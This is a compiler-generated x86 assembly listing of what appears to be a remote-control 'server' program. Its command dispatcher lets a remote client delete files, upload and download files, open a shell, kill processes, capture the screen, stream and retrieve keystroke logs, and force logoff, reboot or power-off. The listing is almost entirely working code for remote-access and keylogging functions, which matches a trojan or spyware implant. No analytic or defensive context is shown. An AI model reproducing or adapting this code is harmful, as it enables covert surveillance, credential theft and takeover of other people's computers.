	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func3C.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1892] CASE "deldir"		:ClientDelDir (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0004.server:
	mov	eax,addr @_string.03B7.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0005.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func3B.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1893] CASE "delfile"		:ClientDelFile (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0005.server:
	mov	eax,addr @_string.03B8.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0006.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func3A.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1894] CASE "newdir"		:ClientNewDir (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0006.server:
	mov	eax,addr @_string.03B9.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0007.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func39.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1895] CASE "getdrives"	:SendMsg (socket,"DRIVES "+GetDrivesB())
	jmp	end.select.00BE.server			;;; i69
case.00BE.0007.server:
	mov	eax,addr @_string.03BA.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0008.server			;;; i71
	call	func1E.server			;;; i619
	mov	ebx,addr @_string.03BB.server			;;; i663
	push	ebx			;;; i781
	push	eax			;;; i781a
	push	2			;;; i781e
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1896] CASE "treeb"		:ClientTree (socket,"DIR",str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0008.server:
	mov	eax,addr @_string.03BC.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0009.server			;;; i71
	mov	eax,addr @_string.03BD.server			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-52],eax			;;; i670
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func38.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [1897] CASE "getenv"		:ClientGetEnv(socket)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0009.server:
	mov	eax,addr @_string.03BE.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.000A.server			;;; i71
	push	[ebp+8]			;;; i674a
	call	func37.server			;;; i619
;
; [1898] CASE "_event"		:IFT #StreamKey THEN SendMsg (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.000A.server:
	mov	eax,addr @_string.03BF.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.000B.server			;;; i71
	mov	eax,d[%#StreamKey.server]			;;; i663a
	test	eax,eax			;;; i220
	jz	>> else.00BF.server			;;; i221
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
else.00BF.server:
end.if.00BF.server:
;
; [1899] CASE "upload"		:ClientUpload (str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.000B.server:
	mov	eax,addr @_string.03C1.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.000C.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func35.server			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
;
; [1900] CASE "download"		:ClientDownload (str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.000C.server:
	mov	eax,addr @_string.03C2.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.000D.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	call	func34.server			;;; i619
	sub	esp,4			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,4			;;; i633
;
; [1901] CASE "listen"		:ClientListen (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.000D.server:
	mov	eax,addr @_string.03C3.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.000E.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func36.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1902] CASE "sysmenu"		:ClientSysMenu (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.000E.server:
	mov	eax,addr @_string.03C4.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.000F.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func33.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1903] CASE "mailreply"	:ClientMailReply (socket)
	jmp	end.select.00BE.server			;;; i69
case.00BE.000F.server:
	mov	eax,addr @_string.03C5.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0010.server			;;; i71
	push	[ebp+8]			;;; i674a
	call	func2A.server			;;; i619
;
; [1904] CASE "estop"		:EventStopRecording ()
	jmp	end.select.00BE.server			;;; i69
case.00BE.0010.server:
	mov	eax,addr @_string.03C6.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0011.server			;;; i71
	call	func53.server			;;; i619
;
; [1905] SendMsg (socket,"CMSG *** Event recording stopped ***")
	mov	eax,addr @_string.03C7.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1906] CASE "estart"		:EventStartRecording ()
	jmp	end.select.00BE.server			;;; i69
case.00BE.0011.server:
	mov	eax,addr @_string.03C8.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0012.server			;;; i71
	call	func52.server			;;; i619
;
; [1907] SendMsg (socket,"CMSG *** Event recording started ***")
	mov	eax,addr @_string.03C9.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1908] CASE "resetscr"		:file$ = $$SR_SCRCAP
	jmp	end.select.00BE.server			;;; i69
case.00BE.0012.server:
	mov	eax,addr @_string.03CA.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0013.server			;;; i71
#ifdef ProcessCommands.file$
#undef ProcessCommands.file$
#endif
#define ProcessCommands.file$ ebp-64	; exposes local variable 'file$'
;
	mov	eax,addr @_string.18E5.server			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-64]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1909] DeleteFileA (&file$)
;
; [0] EXTERNAL FUNCTION DeleteFileA (lpFileName)
	mov	eax,d[ebp-64]			;;; i642
	push	eax			;;; i667a
	call	_DeleteFileA@4			;;; i619
;
; [1910] ReleaseSemaphore (#hSCAPS,1,NULL)
#ifdef ProcessCommands.NULL
#undef ProcessCommands.NULL
#endif
#define ProcessCommands.NULL ebp-68	; exposes local variable 'NULL'
;
	push	[ebp-68]			;;; i674a
	push	1			;;; i656a
	push	[%#hSCAPS.server]			;;; i672a
	call	_ReleaseSemaphore@12			;;; i619
;
; [1911] CloseHandle (#hSCAPS)
	push	[%#hSCAPS.server]			;;; i672a
	call	_CloseHandle@4			;;; i619
;
; [1912] Sleep(1000)
	push	1000			;;; i656a
	call	_Sleep@4			;;; i619
;
; [1913] #hSCAPS = CreateSemaphoreA (NULL,1,1,NULL)
	push	[ebp-68]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-68]			;;; i674a
	call	_CreateSemaphoreA@16			;;; i619
	mov	d[%#hSCAPS.server],eax			;;; i668
;
; [1914] SendMsg (socket,"CMSG *** RESET ***")
	mov	eax,addr @_string.03CF.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1915] CASE "email"		:ClientEmail (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0013.server:
	mov	eax,addr @_string.03D0.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0014.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func32.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1916] CASE "strevent"		:ClientStreamKeys (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0014.server:
	mov	eax,addr @_string.03D1.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0015.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func31.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1917] CASE "getslog"		:ClientGetKeyLog (socket)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0015.server:
	mov	eax,addr @_string.03D2.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0016.server			;;; i71
	push	[ebp+8]			;;; i674a
	call	func2E.server			;;; i619
;
; [1918] CASE "getelog"		:ClientGetEventLog (socket)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0016.server:
	mov	eax,addr @_string.03D3.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0017.server			;;; i71
	push	[ebp+8]			;;; i674a
	call	func2F.server			;;; i619
;
; [1919] CASE "logoff"		:SendMsg (socket,"CMSG *** logging off ***")
	jmp	end.select.00BE.server			;;; i69
case.00BE.0017.server:
	mov	eax,addr @_string.03D4.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0018.server			;;; i71
	mov	eax,addr @_string.03D5.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1920] ExitWindowsEx ($$EWX_LOGOFF | $$EWX_FORCEIFHUNG,0)
;
; [0] EXTERNAL FUNCTION ExitWindowsEx (uFlags, dwReserved)
	mov	eax,0			;;; i659
	or	eax,16			;;; i763
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_ExitWindowsEx@8			;;; i619
;
; [1921] CASE "reboot"		:SendMsg (socket,"CMSG *** rebooting ***")
	jmp	end.select.00BE.server			;;; i69
case.00BE.0018.server:
	mov	eax,addr @_string.03D8.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0019.server			;;; i71
	mov	eax,addr @_string.03D9.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1922] ExitWindowsEx ($$EWX_REBOOT | $$EWX_FORCEIFHUNG,0)
	mov	eax,2			;;; i659
	or	eax,16			;;; i763
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_ExitWindowsEx@8			;;; i619
;
; [1923] CASE "poweroff"		:SendMsg (socket,"CMSG *** powering off ***")
	jmp	end.select.00BE.server			;;; i69
case.00BE.0019.server:
	mov	eax,addr @_string.03DB.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.001A.server			;;; i71
	mov	eax,addr @_string.03DC.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1924] ExitWindowsEx ($$EWX_POWEROFF | $$EWX_FORCEIFHUNG,0)
	mov	eax,8			;;; i659
	or	eax,16			;;; i763
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_ExitWindowsEx@8			;;; i619
;
; [1925] CASE "status"		:ClientStatus (socket)
	jmp	end.select.00BE.server			;;; i69
case.00BE.001A.server:
	mov	eax,addr @_string.03DE.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.001B.server			;;; i71
	push	[ebp+8]			;;; i674a
	call	func2D.server			;;; i619
;
; [1926] CASE "popup"		:ClientPopup (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.001B.server:
	mov	eax,addr @_string.03DF.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.001C.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func2C.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1927] CASE "proclist"		:ClientProcList (socket)
	jmp	end.select.00BE.server			;;; i69
case.00BE.001C.server:
	mov	eax,addr @_string.03E0.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.001D.server			;;; i71
	push	[ebp+8]			;;; i674a
	call	func28.server			;;; i619
;
; [1928] CASE "prockill"		:ClientProcKill (socket,XLONG(TRIM$(str$)))
	jmp	end.select.00BE.server			;;; i69
case.00BE.001D.server:
	mov	eax,addr @_string.03E1.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.001E.server			;;; i71
	sub	esp,64			;;; i487
	sub	esp,64			;;; i487
	mov	eax,[%B%str$.server]			;;; i663a
	mov	d[esp],eax			;;; i887
	call	%_trim.d.v			;;; i583
	add	esp,64			;;; i600
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.s			;;; i492a
	add	esp,64			;;; i600
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func2B.server			;;; i619
;
; [1929] CASE "capscr"		:GetToken (@str$,@saveas$,',')
	jmp	end.select.00BE.server			;;; i69
case.00BE.001E.server:
	mov	eax,addr @_string.03E2.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.001F.server			;;; i71
#ifdef ProcessCommands.saveas$
#undef ProcessCommands.saveas$
#endif
#define ProcessCommands.saveas$ ebp-72	; exposes local variable 'saveas$'
;
	push	44			;;; i656a
	push	[ebp-72]			;;; i674a
	push	[%B%str$.server]			;;; i672a
	call	funcF.server			;;; i619
	mov	ecx,d[esp-12]			;;; i877a
	mov	ebx,d[esp-8]			;;; i877b
	mov	[%B%str$.server],ecx			;;; i668
	mov	[ebp-72],ebx			;;; i670
;
; [1930] GetToken (str$,@qual$,0)
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	mov	d[ebp-52],eax			;;; i670
#ifdef ProcessCommands.qual$
#undef ProcessCommands.qual$
#endif
#define ProcessCommands.qual$ ebp-76	; exposes local variable 'qual$'
;
	push	0			;;; i656a
	push	[ebp-76]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	funcF.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-76],ecx			;;; i670
	add	esp,12			;;; i633
;
; [1931] ClientCapScr (socket,saveas$,XLONG(qual$))
	mov	eax,d[ebp-72]			;;; i665
	call	%_clone.a0			;;; i634
	mov	d[ebp-52],eax			;;; i670
	sub	esp,64			;;; i487
	mov	eax,[ebp-76]			;;; i665
	mov	d[esp],eax			;;; i887
	call	%_cv.string.to.xlong.v			;;; i492a
	add	esp,64			;;; i600
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func27.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [1932] CASE "shell"		:ClientShell (socket,str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.001F.server:
	mov	eax,addr @_string.03E6.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0020.server			;;; i71
	mov	eax,d[%B%str$.server]			;;; i663a
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func29.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1933] CASE "pong"			:
	jmp	end.select.00BE.server			;;; i69
case.00BE.0020.server:
	mov	eax,addr @_string.03E7.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0021.server			;;; i71
;
; [1934] CASE "wan"			:NETWORK = $$FALSE
	jmp	end.select.00BE.server			;;; i69
case.00BE.0021.server:
	mov	eax,addr @_string.03E8.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0022.server			;;; i71
	mov	eax,0			;;; i659
	mov	d[%NETWORK.server],eax			;;; i668
;
; [1935] CASE "lan"			:NETWORK = $$TRUE
	jmp	end.select.00BE.server			;;; i69
case.00BE.0022.server:
	mov	eax,addr @_string.03E9.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0023.server			;;; i71
	mov	eax,-1			;;; i659
	mov	d[%NETWORK.server],eax			;;; i668
;
; [1936] CASE "shutdown"		:SendMsg (socket,"CMSG *** SHUTTING DOWN ***")
	jmp	end.select.00BE.server			;;; i69
case.00BE.0023.server:
	mov	eax,addr @_string.03EA.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0024.server			;;; i71
	mov	eax,addr @_string.03EB.server			;;; i663
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1937] NetSleep(100)
	push	100			;;; i656a
	call	func51.server			;;; i619
;
; [1938] 'ShutDown ()
;
; [1939] ServiceStop()
	call	func6C.server			;;; i619
;
; [1940] CASE "auth"			:' do nothing
	jmp	end.select.00BE.server			;;; i69
case.00BE.0024.server:
	mov	eax,addr @_string.03EC.server			;;; i663
	mov	ebx,[ebp-60]			;;; i665
	call	%_string.compare.vv			;;; i690
	jne	>> case.00BE.0025.server			;;; i71
;
; [1941] CASE ELSE			:SendMsg (socket,"CMSG invalid: "+cmd$+" "+str$)
	jmp	end.select.00BE.server			;;; i69
case.00BE.0025.server:
	mov	eax,addr @_string.03ED.server			;;; i663
	mov	ebx,[ebp-40]			;;; i665
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	0			;;; i781d
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,addr @_string.0230.server			;;; i663
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	mov	ebx,[%B%str$.server]			;;; i663a
	push	eax			;;; i781b
	push	ebx			;;; i781c
	push	4			;;; i781f
	call	main.concat			;;; i782
	add	esp,12			;;; i782a
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	func24.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,8			;;; i633
;
; [1942] :RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.funcB.server			;;; i258
;
; [1943] END SELECT
end.select.00BE.server:
;
; [1944] END IF
else.00BD.server:
end.if.00BD.server:
;
; [1945] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ProcessCommands.server:  ;;; Function end label for Assembly Programmers.
end.funcB.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.funcB.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
free.funcB.server:
	mov	esi,[ebp-76]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-72]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-60]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-64]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  ProcessCommands ()  *****
;  *****
;
; [1947] FUNCTION ClientRefresh (socket,STRING dir)
.code
;
#ifdef ClientRefresh.socket
#undef ClientRefresh.socket
#endif
#define ClientRefresh.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientRefresh.dir
#undef ClientRefresh.dir
#endif
#define ClientRefresh.dir ebp+12	; exposes function argument 'dir'
;
align 16
_ClientRefresh.server@8:
;  *****
;  *****  FUNCTION  ClientRefresh ()  *****
;  *****
func3E.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody3E.server:
;
; [1949] ClientTree (socket,"REFRESH",dir)
	mov	eax,addr @_string.03F0.server			;;; i663
	call	%_clone.a0			;;; i634
; .xstk3E.0000 = ebp-44	; internal variable
	mov	d[ebp-44],eax			;;; i670
	mov	eax,d[ebp+12]			;;; i665
	call	%_clone.a0			;;; i634
	push	eax			;;; i667a
	push	[ebp-44]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	func38.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+8]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
;
; [1950] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.ClientRefresh.server:  ;;; Function end label for Assembly Programmers.
end.func3E.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  ClientRefresh ()  *****
;  *****
;
; [1952] FUNCTION ClientFileInfo (socket,STRING filename)
.code
;
#ifdef ClientFileInfo.socket
#undef ClientFileInfo.socket
#endif
#define ClientFileInfo.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef ClientFileInfo.filename
#undef ClientFileInfo.filename
#endif
#define ClientFileInfo.filename ebp+12	; exposes function argument 'filename'
;
align 16
_ClientFileInfo.server@8:
;  *****
;  *****  FUNCTION  ClientFileInfo ()  *****
;  *****
func3F.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func3F.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,3				;;; ..
	xor	eax,eax			;;; ...
A.269:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.269			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,168			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,10				;;; ..
	xor	eax,eax			;;; ...
A.270:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.270			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	lea	ebx,[esp+320]			;;; i125a
	mov	d[ebp-44],eax			;;; i670
	mov	d[ebp-56],ebx			;;; i670
funcBody3F.server:
;
; [1953] WIN32_FIND_DATA wfd
; .composites = ebp-40	; internal variable
#ifdef ClientFileInfo.wfd
#undef ClientFileInfo.wfd
#endif
#define ClientFileInfo.wfd ebp-44	; exposes local variable 'wfd'
;
;
; [1954] STRING fi,tsize
#ifdef ClientFileInfo.fi
#undef ClientFileInfo.fi
#endif
#define ClientFileInfo.fi ebp-48	; exposes local variable 'fi'
;
#ifdef ClientFileInfo.tsize
#undef ClientFileInfo.tsize
#endif
